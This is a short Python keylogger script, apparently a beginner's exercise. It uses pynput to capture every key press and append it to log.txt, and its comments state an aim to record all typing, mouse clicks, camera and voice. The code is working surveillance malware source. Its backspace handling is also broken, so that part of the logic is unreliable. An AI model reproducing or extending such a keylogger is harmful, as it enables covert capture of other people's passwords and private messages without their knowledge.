#keylogger - it should save any type of movement on the computer i.e, whatever youtyped, mouse clicks, camera, voice etc.
#---storing keystrockes in a text file---
#File handling - read, write, append

#f = open("log.txt","a") # the open function will create a new file or use the existing file. 'open(file_name, mode)'
#filedata = f.read()
#print(filedata)
#f.write("\nHey hwu")
#f.close() #v.important
# r - read, w- write , a- append(mainly used for a keylogger)
#Listener - listen to the keystrokes - pynput
from pynput.keyboard import Listener

def writetofile(key):
    word = str(key)
    word = word.replace("'","")
    
    
    if word == "Key.space":
        word = " "
        
    if word == "Key.shift_r"  :
        word = ""
        
    if word == "Key.shift_l" :
        word = ""
        
    if word == "Key.ctrl_l" :
        word = ""
        
    if word == "Key.enter":
        word = "\n"
    
    if word == "Key.backspace":
        word = word[:-16]
   
    with open("log.txt","a") as f:
        f.write(word)          #the above program can be written like this with the "with" function.

with Listener(on_press=writetofile) as L:
    L.join()
    
    